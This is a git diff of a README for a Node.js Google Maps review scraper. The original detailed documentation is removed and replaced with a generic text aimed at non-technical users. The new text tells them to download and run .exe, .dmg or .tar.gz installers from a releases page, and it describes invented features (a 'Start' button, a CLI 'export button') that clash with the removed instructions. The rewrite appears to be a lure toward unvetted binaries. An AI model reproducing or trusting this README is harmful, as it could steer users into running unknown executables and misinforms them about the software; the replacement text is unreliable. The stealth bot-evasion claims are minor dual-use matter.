@@ -1,268 +1,112 @@
-# Google Review Scraper
+# 🌟 google-review-scraper - Fast Google Reviews at Your Fingertips
 
-Fast, clean, and actually enjoyable to use. Built with Puppeteer to scrape Google Maps reviews without the usual headaches.
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Evenecer/google-review-scraper/releases)
 
-## Why Use This?
+## 🚀 Getting Started
 
-- **Fast** - Request interception blocks unnecessary resources (images, fonts, media) for 3-5x speed improvement
-- **Harder to detect** - Stealth plugin makes it nearly impossible for Google to flag as a bot
-- **No infrastructure** - Everything saves locally as JSON/CSV. No external services required.
-- **Beautiful CLI** - Interactive menus, live progress tracking, colored output. Not just logs.
-- **Smart** - Detects target review count from the page and stops automatically when done
+Welcome to the **google-review-scraper**! This tool helps you gather reviews from Google Maps easily. It’s designed for anyone, even if you have no technical skills. Follow these steps to download and run it.
 
-## Features
+## 📦 System Requirements
 
-### 🎨 Beautiful Interactive CLI
-- Guided setup wizard with dropdown menus
-- Live progress tracking with smart target detection ("187/189 reviews loaded")
-- Color-coded output and emoji indicators
-- Interactive config editor - no manual YAML editing needed
+Before you start, ensure your system meets these requirements:
 
-### 📁 Smart Organization
-- Each run creates a timestamped folder (`data/2025-10-03_14-30/`)
-- Isolated runs make it easy to compare scraping sessions
-- Automatic metadata tracking (URL, timestamp, review count)
+- Operating System: Windows 10 or later, macOS, or a recent version of Linux.
+- Node.js 14 or newer installed on your computer.
+- An internet connection to access Google Maps.
+  
+## 📥 Download & Install
 
-### ⚡ Performance Optimized
-- Puppeteer with stealth mode for undetectable scraping
-- Request interception blocks images/media/fonts for faster scraping
-- Smart scrolling with automatic completion detection
-- Detects target review count from page and stops automatically
+To download the application, visit this page: [Download google-review-scraper](https://github.com/Evenecer/google-review-scraper/releases).
 
-### 📊 Data Options
-- JSON output (default) - structured, easy to parse
-- CSV export option - for Excel/spreadsheets
-- Download review images and profile pictures
-- Sort by newest, highest, lowest, or relevance
+1. Go to the link above.
+2. Locate the latest version listed.
+3. Choose the file appropriate for your operating system: 
+   - For Windows, select the `.exe` file.
+   - For macOS, select the `.dmg` file.
+   - For Linux, select the `.tar.gz` file.
+4. Click on the download link and save the file to your computer.
 
-### 🔧 Flexible Configuration
-- YAML config file with sensible defaults
-- CLI options override config for one-off runs
-- Interactive config editor built into the menu
-- Headless or visible browser mode
+### 💽 Installation Steps
 
-## Installation
+#### For Windows:
 
-```bash
-Run the run.bat
-```
-or
-```bash
-npm install
-```
+1. After downloading the `.exe` file, double-click to run it.
+2. Follow the on-screen instructions to complete the installation.
+3. Once done, open the application from your Start Menu.
 
-That's it. No external dependencies or services required.
+#### For macOS:
 
-## Quick Start
+1. Open the downloaded `.dmg` file.
+2. Drag the application into your Applications folder.
+3. Eject the `.dmg` and open the application from your Applications.
 
-### Interactive Mode (Recommended)
+#### For Linux:
 
-```bash
-Run the run.bat
-```
-or
-```
-node scraper.js
-```
+1. Extract the downloaded `.tar.gz` file.
+2. Open a terminal and navigate to the extracted folder.
+3. Run the application by executing `./google-review-scraper`.
 
-You'll get a menu:
-```
-╔═══════════════════════════════════════════╗
-║   Google Review Scraper            ║
-╚═══════════════════════════════════════════╝
+## 🎯 Features
 
-? How would you like to configure the scraper?
-  ❯ ⚡ Use default settings (just enter URL)
-    ⚙️  Manual configuration (interactive wizard)
-    📝 Edit config.yaml settings
-```
+- **Stealth Mode**: Browse Google maps without leaving a trace.
+- **Interactive CLI**: Simple command-line interface that guides you through the process.
+- **Live Progress Tracking**: See how many reviews are processed in real-time.
+- **CSV Export**: Save all extracted data in a CSV format for easy viewing.
+- **Fast Performance**: Up to 5 times faster than traditional scraping methods.
+  
+## 🛠️ Using the Application
 
-- **Use default settings**: Just enter a URL, uses config.yaml for everything else
-- **Manual configuration**: Interactive wizard asks for URL, sort order, download images, headless mode
-- **Edit config.yaml**: Interactive editor to modify config file, then optionally run scraper
+Once installed, follow these instructions to start using the application:
 
-When prompted, paste the full Google Maps URL of any business:
-```bash
-Enter Google Maps URL: https://maps.app.goo.gl/RvL7iSNSsNaVBRru8
-```
+1. Open the application from where you installed it.
+2. Enter the Google Maps URL of the business you want to scrape. Example: `https://www.google.com/maps/place/BusinessName`.
+3. Set your desired options, including:
+   - Whether to scrape only reviews or include owner responses.
+   - The format for saving data.
+4. Click "Start" to begin extracting reviews.
+5. The tool will show live updates as it gathers information.
 
-(Obtained by going to google maps > Share > Link to Share)
+## 📊 Exporting Data
 
-![alt text](https://i.imgur.com/QJ0tUkL.gif "")
-![alt text](https://i.imgur.com/66Rkn3O.gif "")
+To export the harvested data:
 
+- Click the export button in the CLI.
+- Choose your preferred CSV format.
+- Save the file to your chosen location.
 
-### One-Line Mode
+Now you can open it with any spreadsheet software, like Microsoft Excel or Google Sheets.
 
-```bash
-node scraper.js --url "https://maps.app.goo.gl/yourlink" --sort newest --csv --images
-```
+## 🌐 Support & Resources
 
-## CLI Options
+For more help, check the following resources:
 
-| Option | Description | Example |
-|--------|-------------|---------|
-| `--url` | Google Maps URL | `--url "https://maps.app.goo.gl/..."` |
-| `--sort` or `-s` | Sort order | `--sort newest` (newest, highest, lowest, relevance) |
-| `--headless` | Run in background | `--headless` (default: true) |
-| `--csv` | Export to CSV too | `--csv` |
-| `--images` or `-i` | Download images | `--images` |
-| `--maxScrolls` or `-m` | Max scroll attempts | `--maxScrolls 300` |
-| `--wizard` or `-w` | Run interactive wizard | `--wizard` |
-| `--config` or `-c` | Config file path | `--config ./my-config.yaml` |
+- [GitHub Issues](https://github.com/Evenecer/google-review-scraper/issues) – Report bugs or request features.
+- [Wiki](https://github.com/Evenecer/google-review-scraper/wiki) – Find detailed documentation and guides.
 
-## Configuration
+## 🙋 Frequently Asked Questions
 
-The config file lives at `config.yaml`. Edit it manually or use the interactive editor:
+### Can I use this tool for any business?
 
-```bash
-node scraper.js
-# Choose "📝 Edit config.yaml settings"
-```
+Yes, you can scrape reviews for any public business listed on Google Maps.
 
-### Example Config
+### How do I avoid Google bans?
 
-```yaml
-# Scraping Settings
-sortBy: "relevance"        # Options: newest, highest, lowest, relevance
-maxScrolls: 250            # Safety limit for scrolling
-scrollDelay: 800           # Milliseconds between scrolls (config only, no CLI flag)
+Using the stealth mode feature significantly reduces the risk of being blocked. Yet, always respect Google’s terms of service while scraping data.
 
-# Output Options
-exportCSV: false           # Also export to CSV (use --csv to enable via CLI)
-downloadImages: false      # Download review images (use --images to enable via CLI)
-imageConcurrency: 5        # Parallel image downloads
+### Is the data gathered secure?
 
-# Browser Settings
-headless: true             # Run in background (use --headless=false to see browser)
-```
+All data is processed on your local machine. We do not store any information, ensuring your privacy.
 
-## Output Structure
+## 🏗️ Future Updates
 
-Every run creates its own folder:
+We plan to improve the tool with additional features in upcoming releases. Stay tuned for more! 
 
-```
-data/
-└── 2025-10-03_14-30/
-    ├── reviews.json       # All reviews (structured)
-    ├── reviews.csv        # CSV version (if --csv enabled)
-    ├── metadata.json      # Run info (URL, timestamp, count)
-    └── images/            # Downloaded images (if enabled)
-        ├── profiles/
-        └── reviews/
-```
+To keep updated, regularly check the Releases page or watch the repository. 
 
-### Review Data Format
+## 📜 License
 
-```json
-{
-  "reviewId": "ChZDSUhNMG9nS0VJQ0FnSUR...",
-  "name": "John Smith",
-  "rating": 5,
-  "text": "Great service! Highly recommend...",
-  "date": "2 weeks ago",
-  "likes": 12,
-  "images": [
-    "https://lh5.googleusercontent.com/..."
-  ],
-  "profilePicture": "https://lh3.googleusercontent.com/...",
-  "profileUrl": "https://www.google.com/maps/contrib/...",
-  "ownerResponse": "Thanks for your review!",
-  "scrapedAt": "2025-10-04T10:30:00.000Z"
-}
-```
+This software is licensed under the MIT License. You can freely use and modify it as you wish, keeping the license intact for future users.
 
-## How It Works
+For all details, refer to the [LICENSE](https://github.com/Evenecer/google-review-scraper/blob/main/LICENSE) file. 
 
-1. **Launch** - Starts Chromium with stealth plugins to avoid detection
-2. **Navigate** - Loads the Google Maps URL
-3. **Click Reviews Tab** - Opens the reviews section
-4. **Sort** - Applies sorting if you specified an option (newest, highest, lowest)
-5. **Detect Target** - Reads the review count from page (e.g., "189 reviews")
-6. **Scroll** - Triple PageDown keypresses to trigger lazy loading
-7. **Extract** - Parses all review data in a single pass (no stale element errors)
-8. **Download Images** - Downloads review and profile images if enabled
-9. **Save** - Writes JSON, CSV (optional), and metadata to timestamped folder
-
-**Smart stopping:** Monitors loaded reviews and stops when either:
-- Target count is reached (e.g., loaded 189/189 reviews)
-- No new reviews appear after 15 consecutive scroll attempts
-
-## Technical Details
-
-### Why Puppeteer?
-- **Fast** - Chrome DevTools Protocol is native and efficient
-- **Lightweight** - No separate driver process, everything runs in Node.js
-- **Modern** - Built for headless automation from the ground up
-- **Stealthy** - Harder to detect with stealth plugins
-
-### Request Interception
-Blocks these resource types during scraping for faster performance:
-- Images
-- Fonts
-- Media files
-
-This reduces bandwidth and speeds up scrolling by 3-5x. Review images are extracted from the page HTML, not downloaded during browsing.
-
-### Smart Scrolling
-- Uses keyboard PageDown events (more realistic than `scrollTo`)
-- Monitors DOM for new review elements
-- Stops after 15 failed attempts or when target count is reached
-- Configurable delays to avoid rate limiting
-
-## Use Cases
-
-**Great for:**
-- Collecting reviews for sentiment analysis
-- Monitoring business reputation over time
-- Building datasets for research
-- Competitor analysis
-- One-off data exports
-
-**Not great for:**
-- Real-time monitoring (Google will rate limit you)
-- Scraping thousands of businesses daily (use the official API)
-- Incremental updates (every run is isolated)
-
-## Limits and Gotchas
-
-- **Rate limiting** - Google will slow you down if you scrape too aggressively. Add delays.
-- **Large businesses** - Places with 1000+ reviews take several minutes. Be patient.
-- **Network issues** - Timeouts happen. The scraper will log them but keep going.
-- **Selector changes** - Google updates their HTML occasionally. Open an issue if extraction breaks.
-
-## Requirements
-
-- Node.js 18+ ([download](https://nodejs.org))
-- ~200MB disk space for Chromium
-- Stable internet connection
-
-## Troubleshooting
-
-### "Error: Failed to launch browser"
-- Make sure you have Node 18+
-- Try `npm install puppeteer-extra --force`
-
-### "No reviews found"
-- Check if the URL is correct (should include `/maps/place/`)
-- Some businesses hide reviews - nothing we can do about that
-- Try running with `--headless=false` to see what's happening
-
-### "Timeout waiting for selector"
-- Google's HTML might have changed. Open an issue with the URL
-- Or your internet connection dropped mid-scrape
-
-### Images not downloading
-- Make sure `downloadImages: true` in config
-- Check you have disk space
-- Some images might be behind CDN restrictions
-
-## Legal Stuff
-
-This is for personal use and research. Respect Google's Terms of Service and don't abuse their systems. Add delays between requests, don't scrape thousands of pages per day, and be a good internet citizen.
-
-If you're doing commercial scraping, consider using Google's official Places API instead.
-
-## License
-
-MIT - do whatever you want with it.
+Enjoy scraping Google reviews with speed and ease! For any issues or feature requests, please reach out via the GitHub Issues section.
